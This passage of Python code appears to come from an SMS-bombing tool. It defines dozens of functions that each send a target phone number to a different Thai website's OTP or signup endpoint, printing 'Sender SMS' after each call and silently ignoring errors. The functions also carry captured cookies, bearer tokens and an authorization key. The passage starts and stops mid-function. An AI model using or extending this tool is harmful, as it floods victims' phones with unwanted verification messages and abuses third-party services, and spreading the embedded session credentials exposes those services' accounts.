            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "accept": "application/json, text/plain, */*",
            "referer": "https://www.carsome.co.th/sell-car?gclsrc=aw.ds&&&utm_source=Google&utm_medium=Search&utm_campaign=TH_C2B_Valuation_SmartPhrase_Core_&utm_term=Search_Core_C2B_TH_Perf_Conv_&utm_content=%E0%B8%A3%E0%B8%96%E0%B8%A1%E0%B8%B7%E0%B8%AD%E0%B8%AA%E0%B8%AD%E0%B8%87%E0%B8%A3%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%96%E0%B8%B9%E0%B8%81&gclid=Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB",
            "cookie": "_gcl_au=1.1.1272461332.1638187764;G_ENABLED_IDPS=google;_ga=GA1.3.808434087.1638187769;__lt__cid=10b9db7a-fed7-4a04-99d2-cdf99ccd76b8;_gid=GA1.3.1113186157.1639742520;_fbp=fb.2.1639742521800.1608632439;ajs_anonymous_id=fc77ca54-b140-4d14-a811-9be694d4dcfa;_hjSessionUser_1895262=eyJpZCI6IjJmYTg1NjkzLTIwYWUtNTQ3ZC1iYTgyLTZjMTZhNDE4N2VjOSIsImNyZWF0ZWQiOjE2Mzk3NDI1MjIzMDAsImV4aXN0aW5nIjp0cnVlfQ==;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;panoramaId_expiry=1640349594875;panoramaId=052fccf0cccc27f1f255389082ee16d53938c5a780adb183ac3642512b6c17dc;_clck=18ofz7k|1|exd|0;cnpylab_deviceId=IuD7oBeC61H6n41Z1FH3ek;_gcl_aw=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gcl_dc=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;amp_893e6b=IuD7oBeC61H6n41Z1FH3ek...1fn7egd40.1fn7egjki.1.3.4;__lt__sid=f6ad8bda-06d0796d;_gac_UA-70043720-5=1.1639853872.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gat_UA-70043720-5=1;_uetsid=23e4ae005f3111ec8d8c79ffb5e7c09b;_uetvid=33f5ca20510d11ec8e1175a84efe64f8;_hjSession_1895262=eyJpZCI6IjY2YWZlZmI0LWMwMDYtNGFkMS1hMWE3LTQ3NDllYmQ2MDNjYSIsImNyZWF0ZWQiOjE2Mzk4NTM4NzU4MDd9;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=0;_clcnp=15fms60|1639853877001|1|1|e.clarity.ms/collect"
            }
            response = requests.post("https://www.carsome.co.th/website/login/sendSMS", headers=head, json={"username":phone,"optType":0})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api36():
        try:
            head = {
            "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..o2KGFaI9sj29aEhCf9hApg.8hkBGU4xqfvuMOjMnNVDZjwqkjUcapX7Nnm4r5NZ-LsHH54KqovZT8OcwcnpjsUoh0_8NKc7aBicXTwiVy-yR_lly-2hWlWsxCG8cR-ucaKrjhJPzHMoLHdw8TKNeeIq5kGuyTsmB-WVAxDn7G5-v0Q.RkQDS8sYQYMpTilU1VOz1A",
            "content-type": "application/json; charset=utf-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "accept": "*/*",
            "referer": "https://nocnoc.com/login",
            "cookie": "_gcl_au=1.1.2015626896.1637433514;_ga=GA1.2.2121914407.1637433515;__lt__cid=4ba7a030-4806-44f7-b0bc-eb65b3b9b13f;_fbp=fb.1.1637433519859.82249249;_hjSessionUser_1027858=eyJpZCI6IjExYjI1OTM1LWExZmItNTNjZS1hN2RlLTc4YmQwMjQzNmRkZCIsImNyZWF0ZWQiOjE2Mzc0MzM1MTkwMjUsImV4aXN0aW5nIjp0cnVlfQ==;ajs_anonymous_id=%22b70a4a48-dc6e-407c-9a31-37cb925d24e0%22;__lt__sid=dfc427cb-21404fe4;_gid=GA1.2.1348859339.1639856210;_gat_gaTracker=1;_hjSession_1027858=eyJpZCI6Ijk5MWY0ZjhlLTI0MjAtNDA2YS05MjM0LTJkYTliMzU4OTBkYyIsImNyZWF0ZWQiOjE2Mzk4NTYyMTIyNzV9;_hjIncludedInSessionSample=0;_hjAbsoluteSessionInProgress=0;cto_bundle=hwhaQ19FRiUyRlI5b0h0T1B5YlBlUG1YQzBEWmlxUDhqWDNBT3Qyc0hKVXBsJTJCazNaUlJFMHVMem5DMEh3OEJYUFNnWUI1MGhiSGVkOG9ab3NoUjNMbSUyRnpUd2N4SWU3Q1lnYkZvUnZsJTJGZTVveldmRWliWW5SYWhrJTJCbkxNTmhOaFBSOGNrQlhDRmUwQVpaVW41Q3ElMkJ0Yk9yNVJjVGclM0QlM0Q;_gat_UA-124531227-1=1"
            }
            response = requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",headers=head,json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone":phone,"type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName":"ฟงฟง ฟงฟว"}})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api37():
        try:
            response = requests.post("https://icq.com/smscode/login/en", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api38():
        try:
            response = requests.post("https://api.1112delivery.com/api/v1/otp/create", data={'phonenumber': phone,'language': "th"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api40():
        try:
            headers={
            "organizationcode": "lifestyle",
            "content-type": "application/json"
            }
            json = {"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone,"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"}
            response = requests.post("https://graph.firster.com/graphql",headers=headers,json=json)
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api41():
        try:
            response = requests.post("https://m.riches666.com/api/register-otp", data={"brands_id":"60a6563a232a600012521982","agent_register":"60a76a7f233d2900110070e0","tel":phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api42():
        try:
            head = {
            "x-requested-with": "XMLHttpRequest",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "accept": "*/*",
            "referer": "https://www.pruksa.com/member/register/otp_code",
            "cookie": "verify=test;_gcl_au=1.1.1068520588.1638975731;_fbp=fb.1.1638975732655.1853691445;_accept_privacy=1;_gid=GA1.2.1560033587.1639887354;PHPSESSID=p8hr5emvd96q6lu10dm6tmfgt7;exp_last_visit=1639452885;exp_csrf_token=3e1cdd2103438cac128d4e8e653ef743f8311dae;_cbclose=1;_cbclose41932=1;_uid41932=2F6F4EEE.5;_ctout41932=1;exp_last_activity=1639887731;exp_tracker=a%3A3%3A%7Bi%3A0%3Bs%3A24%3A%22member%2Fregister%2Fotp_code%22%3Bi%3A1%3Bs%3A15%3A%22member%2Fregister%22%3Bi%3A2%3Bs%3A19%3A%22member%2Flogin%2Fdialog%22%3B%7D;AWSALB=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;AWSALBCORS=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;_ga_1S3Q68V0J2=GS1.1.1639887351.6.1.1639887736.0;_ga=GA1.2.1203242697.1638975732;_gat_UA-12021683-1=1;exp_current_url=https%3A%2F%2Fwww.pruksa.com%2Fmember%2Fregister%2Fotp_code"
            }
            response = requests.post("https://www.pruksa.com/member/member_otp/re_create",headers=head,data=f"required=otp&mobile={phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api43():
        try:
            head = {
            "content-type": "application/json;charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "accept": "application/json, text/plain, */*",
            "referer": "https://vaccine.trueid.net/",
            "cookie": "tids=cj6rr5kfn7n5eq48kjvtjshbmm6fl822;visid_incap_2104120=tLQf04X9QQOCL3N5NvNoVFt6lGEAAAAAQUIPAAAAAACBOqMUEW78XaYnxR7kJ7pF;_ga_id=908257605.1637120616;_gcl_au=1.1.781159093.1639210714;_fbp=fb.1.1639210716826.1287073338;visid_incap_2608850=sCqytT60R3yHmHPZaoQgs9WLuGEAAAAAQUIPAAAAAADemRF44I7x0AvVgLWDt3rL;pbjs-pubCommonId=4764c6cc-f296-45a4-873a-5cd0bd43510e;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;unique_user_id=332651712.1639210715;__gads=ID=abe63e684890d998:T=1639484401:S=ALNI_MbXUWyQkNhtJ2m57vxHz6ORO4bxRg;_ga=GA1.2.332651712.1639210715;_gid=GA1.2.465629380.1639888137;_gat_UA-86733131-1=1;_cbclose=1;_cbclose26068=1;_uid26068=B513FC64.8;_ctout26068=1;verify=test;OptanonConsent=isIABGlobal=false&datestamp=Sun+Dec+19+2021+11%3A29%3A09+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1&geolocation=%3B&AwaitingReconsent=false;OptanonAlertBoxClosed=2021-12-19T04:29:09.733Z;_ga_R05PJC3ZG8=GS1.1.1639888134.6.1.1639888160.34"
            }
            response = requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",headers=head,json={"msisdn":phone,"function":"enroll"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api44():
        try:
            head = {
            "x-requested-with": "XMLHttpRequest",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "accept": "*/*",
            "referer": "https://ufa108.ufabetcash.com/register.php",
            "cookie": "PHPSESSID=94e150551f39f0b2fcf142b58c21bb77"
            }
            response = requests.post("https://ufa108.ufabetcash.com/api/",headers=head,data=f"cmd=request_form_register_detail_check&web_account_id=36&auto_bank_group_id=1&m_name=sl&m_surname=ak&m_line=snsb1j&m_bank=4&m_account_number=8572178402&m_from=41&m_phone={phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass

    def api48():
        try:
            response = requests.post("https://m.pgwin168.com/api/register-otp",json ={"brands_id":"60e4016f35119800184f34a5","agent_register":"60e57c3b2ead950012fc5fba","tel": phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api49():
        try:
            response = requests.post("https://www.som777.com/api/otp/register",json ={"applicant": phone,"serviceName":"SOM777"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api50():
        try:
            response = requests.post("https://www.konglor888.com/api/otp/register",json = {"applicant": phone,"serviceName":"KONGLOR888"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api51():
        try:
            response = requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api52():
        try:
            response = requests.get("https://users.cars24.co.th/oauth/consumer-app/otp/"+phone+"?lang=th", headers = {"accept": "application/json, text/plain, */*","x_vehicle_type":"CAR","cookie":"_ga=GA1.3.523508414.1640152799;_gid=GA1.3.999851247.1640152799;_fbp=fb.2.1640152801502.837786780;_gac_UA-65843992-28=1.1640152807.EAIaIQobChMIi9jVo9329AIVizArCh1bFAuMEAAYASAAEgJqA_D_BwE;_dc_gtm_UA-65843992-28=1;_hjSessionUser_2738441=eyJpZCI6IjYwMjMzZjYyLTFlMzYtNWZmMy04MjZkLTMzOTAxNTMwODQ4NyIsImNyZWF0ZWQiOjE2NDAxNTI4MDEzMDYsImV4aXN0aW5nIjp0cnVlfQ==;_hjSession_2738441=eyJpZCI6ImI4MDNlNTFkLTFiYTYtNGExZi05MGIzLTk5OWRmMjhhM2RiOCIsImNyZWF0ZWQiOjE2NDAxNjY4ODgwNDF9;_hjAbsoluteSessionInProgress=0;cto_bundle=uVFzcF8lMkYxM0hsRGxQc1M4YThaRmhHJTJGRTBtSUdwNzVuRkVldzI5QlpIYktWbnZFcUlzdDZ1ZnhMT3JqVVhFQyUyQmtGUE9MTFk5akpyVnl4ekZnZlJ4UVN3WnRHdUNyJTJGWW03aVRSeWtLc2wxTjA3QmR0THNzcjNsJTJCcEJHSXlOUzNxTVc2ZmJPaGclMkZhRUhkV3I2cTI1dXUlMkZhYnl1dyUzRCUzRA"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api53():
        try:
            response = requests.post("https://www.kaitorasap.co.th/login/", data = {"phone_number": phone,"lag": " "})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api57():
        try:
            response = requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api58():
        try:
            head = {
            "x-requested-with": "XMLHttpRequest",
            "accept": "text/html, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "referer": "https://www.tgfone.com/signin/register"
            }
            response = requests.post("https://www.tgfone.com/signin/otp_chk_fast",headers=head,json=f"mobile={phone}&type_otp=7")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api59():
        try:
            head = {
            "x-requested-with": "XMLHttpRequest",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "referer": "https://ufa3bb.com/account/register",
            "cookie": "_ga=GA1.2.1794924533.1639040857;ci_session=alj35so836p0d39gckneiqsuql03193n"
            }
            response = requests.post("https://ufa3bb.com/account/register/sendotp",headers=head,data=f"phone={phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api60():
        try:
            response = requests.post("https://login.s-momclub.com/accounts.otp.sendCode", data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Flogin&sdkBuild=12563&format=json",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "gmid=gmid.ver4.AcbHriHAww._ill8qHpGNXtv9aY3XQyCvPohNww4j7EtjeiM3jBccqD7Vx0OmGeJuXcpQ2orXGs.nH0yRZjbm75C-5MVgB2Ii0PWvx6TICBn1LYI_XtlgoHg9mnouZgNs6CHULJEitOfkBhHvf8zUvrvMauanc52Sw.sc3;ucid=Tn63eeu2u8ygoINkqYBk5w;hasGmid=ver4;_ga=GA1.2.1714152564.1642328595;_fbp=fb.1.1642328611770.178002163;_gcl_au=1.1.64457176.1642329285;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;_gid=GA1.2.1524201365.1642442639;_gat=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gat_UA-62402337-1=1"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api61():
        try:
            response = requests.post("https://globalapi.pointspot.co/papi/oauth2/signinWithPhone", data={"phoneNumber": f"+66{phone[1:]}"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api62():
        try:
            response = requests.get(f"https://hdmall.co.th/phone_verifications?express_sign_in=1&mobile={phone}")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api64():
        try:
            response = requests.post("https://account.xiaomi.com/pass/sendPhoneRegTicket", data=f"region=US&phone=%2B66{phone[1:]}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "captchaToken=mXYXs+xvEHAZdhKnXK1XlopRcisSn05D6xhZU+uL3ghvh1Yf/4rYTExH+2xl+yZv;deviceId=wb_aca09552-fd37-4204-9d7a-20045de5c5bf;uLocale=en"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api65():
        try:
            response = requests.post("https://gamingnation.dtac.co.th/api/otp/request", data={"template":"register","phone_no":phone},headers={"User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api66():
        try:
            response = requests.post("https://www.aurora.co.th/signin/otp_chk", data=f"mobile={phone}&type_otp=3",headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api67():
        try:
            response = requests.get(f"https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=66{phone[1:]}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2")
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api69():
        try:
            response = requests.post("https://login.928royal.com/api/APISendOTP.php", data=f"mobileNumber=0{phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api70():
        try:
            response = requests.post("https://prettygaming168-api.auto888.cloud/api/v3/otp/send", data={"tel":phone,"otp_type":"register"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "Basic 755b4608e637d413d668502704d93e377f4f67b2d3d0f50e5644af3607f31ddb3174ecaf5b2c40c86f9efc32de1ee0bbf3e7a2b32cb055a3cb7068e1bb152844"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api71():
        try:
            response = requests.post("https://www.bigthailand.com/authentication-service/user/OTP", json={"locale":"th","phone": f"+66{phone[1:]}","email":"dkdk@gmail.com","userParams":{"buyerName":"ekek ks","activateLink":"www.google.com"}},headers={"content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg","cookie": "auth.strategy=local;auth._token.local=Bearer%20eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg;_utm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6InJlZmVycmVyIiwidGlt%0D%0AZSI6MTY0MjMyOTM5OTU4NSwiY2hlY2tzdW0iOiJaMjl2WjJ4bExXTndZeTFoWkhkdmNtUnpMVEUy%0D%0ATkRJek1qa3pPVGsxT0RVPSJ9;_pk_ref.564990563.2c0e=%5B%22%22%2C%22%22%2C1642329400%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D;_pk_ses.564990563.2c0e=*;_gcl_au=1.1.833577636.1642329400;_asm_visitor_type=n;_ac_au_gt=1642329406505;cdp_session=1;_asm_uid=637506384;_ga=GA1.2.1026893832.1642329403;_gid=GA1.2.1437369318.1642329403;OptanonConsent=isIABGlobal=false&datestamp=Sun+Jan+16+2022+17%3A36%3A45+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.9.0&hosts=&consentId=e0fe7ec6-3c1e-4aa7-9e72-ecd2ed724416&interactionCount=0&landingPath=https%3A%2F%2Fwww.bigthailand.com%2Fcategory%2F850%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2581%25E0%25B8%25A5%25E0%25B8%25B0%25E0%25B8%2582%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2580%25E0%25B8%25AB%25E0%25B8%25A5%25E0%25B8%25A7%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%3Fgclid%3DCj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0007%3A1;_fbp=fb.1.1642329406623.363807498;_hjSessionUser_2738378=eyJpZCI6ImVkNmZhOGY3LTQwNDctNTNjMi04YTVjLTQ0OGE5MDA4YjhiZCIsImNyZWF0ZWQiOjE2NDIzMjk0MDQ4MDMsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample=0;_hjSession_2738378=eyJpZCI6ImNhN2UwZDFhLTZkNmQtNGM0Mi04YmI1LTg4NWJmNzZjMGExZCIsImNyZWF0ZWQiOjE2NDIzMjk0MTEwNzcsImluU2FtcGxlIjpmYWxzZX0=;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_gac_UA-165856282-1=1.1642329477.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_gcl_aw=GCL.1642329478.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_pk_id.564990563.2c0e=0.1642329400.1.1642329489.1642329400.;_ac_client_id=637515726.1642329496;_ac_an_session=zmzlzhzlzizqzmzjzkzjzdzlzgzkzmzizmzkzhzlzdzizlznzhzgzhzqznzqzlzdzizdzizlznzhzgzhzqznzqzlzdzizlznzhzgzhzqznzqzlzdzizdzgzjzizdzjzd2h25zdzgzdzezizd;au_id=637515726;_ga_80VN88PBVD=GS1.1.1642329399.1.1.1642329493.44"})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api72():
        try:
            response = requests.post("https://api.cashmarket-th.com/app/userinfo/send/smsCode", json={"baseParams":{"platformId":"android","deviceType":"h5","deviceIdKh":"20220118121149smyjjs57jxtqbwkuu74y0vd6p5yzhrmp86872f73364d46d3bf9446ddd583ef61ee8fafe504bab46ec267ca96a99281d6rreqhrlgsg4p3srgv1i5s4pp8u9la6gf1","termSysVersion":"5.1.1","termModel":"A37f","brand":"","termId":"null","appType":"6","appVersion":"2.0.0","pValue":"","position":{"lon":"null","lat":"null"},"bizType":"0000","appName":"Cash Market","packageName":"com.cashmarketth.h5","screenResolution":"720,1280"},"clientTypeFlag":"h5","token":"","phoneNumber":"","timestamp":"1642479101529","bizParams":{"phoneNum":phone,"code":"null","type":200,"channelCode":"hJ071"}})
            print(f"{Fore.BLUE}Sender SMS{Fore.RESET}{Fore.GREEN}:{Fore.RESET}{Fore.RED} {phone[:5]}*****{Fore.RESET}")
        except:pass
    def api73():
        try:
